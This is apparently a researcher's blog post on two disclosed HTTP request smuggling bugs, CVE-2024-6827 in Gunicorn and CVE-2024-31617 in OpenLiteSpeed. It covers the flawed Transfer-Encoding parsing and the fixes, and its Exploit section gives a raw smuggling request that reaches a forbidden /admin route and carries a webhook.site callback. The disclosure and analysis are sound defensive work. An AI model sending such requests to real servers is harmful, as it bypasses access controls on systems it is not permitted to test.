---
title: 'Caught in Transit: A Deep Dive into Two HTTP Request Smuggling Vulnerabilities'
date: 2024-08-08 22:38:40
author: Sayooj B Kumar
author_url: https://twitter.com/_1nt3rc3pt0r_
categories:
 - Web Exploitation
 - Bug Bounty
 - Zeroday
tags:
 - Gunicorn
 - OpenLiteSpeed
 - CVE
---

**tl;dr**

+ CVE-2024-6827 
+ CVE-2024-31617
<!--more-->

# Gunicorn

<br>

## Introduction 

Iam usually not a great fan of Request smuggling since its exploitability is laregly depeneded on the combinations of the FE BE servers.This all started [Yadhu Krishna](https://yadhu.in/about/) found a [zeroday](https://yadhu.in/2024/05/11/Exploiting-HTTP-Request-Smuggling-in-Node.js-and-Gunicorn/) in gunicorn and decided to Host an internal challenge on the Same where he used combination of openlitespeed as a frondend proxy server and gunicorn as BE server.
<br>

## Diving into Source Code

I initially started looking into Gunicorn’s source code, specifically where they handle the [TE and CL headers](https://github.com/benoitc/gunicorn/blob/master/gunicorn/http/message.py#L169), and my attention was immediately drawn to something at the very first stage.

```
elif name == "TRANSFER-ENCODING":
                if value.lower() == "chunked":
                    if chunked:
                        raise InvalidHeader("TRANSFER-ENCODING", req=self)
                    chunked = True
```
When TRANSFER-ENCODING is passed as a header, Gunicorn strictly checks if the value exactly matches to `chunked`, which looks like a valid implementation to catch troublemakers like `TRANSFER-ENCODING: chunkedxd`. But what if `Transfer-Encoding: chunked, gzip` is passed? This is a legitimate header, and Gunicorn, as per its implementation, is not expecting stacked header values. This helped me to imagine a hypothetical situation where we pass valid headers of TE and CL where FE server consider `TRANSFER-ENCODING` since it has precedence over `Content-Length` while Gunicorn try to strictly compare the value and fail since we have stacked values in `chunked, gzip` and continue to proceed with `Content-Length` a TE CL request smuggling. 
<br>

## Proof of Concept

Consider the following dummy application where the /admin route is forbidden by the frontend server(OpenLiteSpeed)

```python
from flask import Flask, render_template, request, redirect, Response
import requests 

app = Flask(__name__)


@app.before_request
def handle_chunking():
    request.environ["wsgi.input_terminated"] = True

@app.route("/admin")
def reached():
    print("welcome Admin")
    return "Welcome Admin"

@app.route("/", methods=["GET", "POST"])
def get():
    return "HELLO NON-SMUGGLER"


if __name__ == "__main__":
    app.run(port=8000)
```
<br>

### Exploit

```
POST / HTTP/1.1
Host: 172.24.10.169
Content-Length: 6
Transfer-Encoding: chunked,gzip

73

GET /admin?callback1=https://webhook.site/717269ae-8b97-4866-9a24-17ccef265a30 HTTP/1.1
Host: 172.24.10.169

0
```
<br>

## Fix

The value of TRANSFER-ENCODING is converted into an array using a comma as the delimiter and then compared.
```python
 for (name, value) in self.headers:
            if name == "CONTENT-LENGTH":
                if content_length is not None:
                    raise InvalidHeader("CONTENT-LENGTH", req=self)
                content_length = value
            elif name == "TRANSFER-ENCODING":
                # T-E can be a list
                # https://datatracker.ietf.org/doc/html/rfc9112#name-transfer-encoding
                vals = [v.strip() for v in value.split(',')]
                for val in vals:
                    if val.lower() == "chunked":
```

<br>
<br>
<br>

# OpenLiteSpeed
<br>

## Introduction

Since the frontend server used for the challenge was OpenLiteSpeed, I was trying out different requests and inspecting them to exploit Gunicorn. I encountered a common vulnerable implementation related to request smuggling.
<br>

## Diving into Source Code

OpenLiteSpeed was comparing if the value of `transfer-encoding` starts with `chunked`. This would intercept an invalid header `TRANSFER-ENCODING: chunkedxd` as a valid `TRANSFER-ENCODING`, while the other server rejects it and falls back to `Content-Length`. Any BE server that integrates with this vulnerable version of OpenLiteSpeed can be easily exploited.

```c
if (strncasecmp(pCur, "chunked", 7) == 0) 

```
<br>

## Fix

```c
if (strncasecmp(pCur, "chunked", 7) == 0
            && m_commonHeaderLen[index] == 7)
```

# External Links

- [Gunicorn public report](https://huntr.com/bounties/1b4f8f38-39da-44b6-9f98-f618639d0dd7)
- [OpenliteSpeed Secure Release](https://github.com/litespeedtech/openlitespeed/releases/tag/v1.8.1)
- [CVE-2024-31617](https://www.cve.org/CVERecord?id=CVE-2024-31617)
- [CVE-2024-6827](https://nvd.nist.gov/vuln/detail/CVE-2024-6827)
